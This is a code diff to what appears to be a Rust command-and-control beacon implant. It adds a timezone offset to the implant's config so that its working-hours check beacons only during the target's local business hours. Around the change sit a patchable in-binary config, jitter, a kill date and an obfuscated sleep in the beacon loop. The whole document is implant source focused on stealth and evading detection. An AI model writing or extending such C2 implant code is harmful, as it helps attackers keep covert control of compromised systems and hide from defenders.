@@ -31,7 +31,8 @@ pub struct PatchableConfig {
     pub user_agent: [u8; 64],
     pub uri: [u8; 64],
     pub host_header: [u8; 64],
-    pub padding: [u8; 32],
+    pub tz_offset: i8,
+    pub padding: [u8; 31],
 }
 
 // Place in .data section to be writable/patchable
@@ -47,7 +48,8 @@ pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
     user_agent: [0u8; 64],
     uri: [0u8; 64],
     host_header: [0u8; 64],
-    padding: [0; 32],
+    tz_offset: 0,
+    padding: [0; 31],
 };
 
 #[derive(Debug, Serialize, Deserialize, Clone, Copy)]
@@ -63,6 +65,7 @@ pub struct C2Config {
     pub jitter: u8,
     pub kill_date: u64,
     pub working_hours: (u8, u8),
+    pub tz_offset: i8,
     pub user_agent: &'static str,
     pub uri: &'static str,
     pub host_header: &'static str,
@@ -118,6 +121,7 @@ impl C2Config {
                     core::ptr::addr_of!(GLOBAL_CONFIG.working_hours_start).read(),
                     core::ptr::addr_of!(GLOBAL_CONFIG.working_hours_end).read(),
                 ),
+                tz_offset: core::ptr::addr_of!(GLOBAL_CONFIG.tz_offset).read(),
                 user_agent: ua_str,
                 uri: uri_str,
                 host_header: host_str,
@@ -766,10 +770,11 @@ fn get_current_unix_time() -> u64 {
     }
 }
 
-fn get_current_hour() -> u8 {
+fn get_current_hour(offset: i8) -> u8 {
     let unix = get_current_unix_time();
-    // Simplified: ignore timezone, assume UTC
-    ((unix % 86400) / 3600) as u8
+    // Apply offset (hours to seconds)
+    let local_unix = (unix as i64 + (offset as i64 * 3600)) as u64;
+    ((local_unix % 86400) / 3600) as u8
 }
 
 fn is_kill_date_reached(kill_date: u64) -> bool {
@@ -779,11 +784,11 @@ fn is_kill_date_reached(kill_date: u64) -> bool {
     get_current_unix_time() > kill_date
 }
 
-fn is_within_working_hours(start: u8, end: u8) -> bool {
+fn is_within_working_hours(start: u8, end: u8, offset: i8) -> bool {
     if start == 0 && end == 0 {
         return true;
     } // 24/7
-    let hour = get_current_hour();
+    let hour = get_current_hour(offset);
     if start < end {
         hour >= start && hour < end
     } else {
@@ -814,7 +819,11 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
             }
 
             // Check WorkingHours
-            if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
+            if !is_within_working_hours(
+                config.working_hours.0,
+                config.working_hours.1,
+                config.tz_offset,
+            ) {
                 crate::utils::obfuscation::sleep(600_000); // Sleep 10 mins and check again
                 continue;
             }
@@ -857,7 +866,11 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
             }
 
             // Check WorkingHours
-            if !is_within_working_hours(config.working_hours.0, config.working_hours.1) {
+            if !is_within_working_hours(
+                config.working_hours.0,
+                config.working_hours.1,
+                config.tz_offset,
+            ) {
                 crate::utils::obfuscation::sleep(600_000);
                 continue;
             }
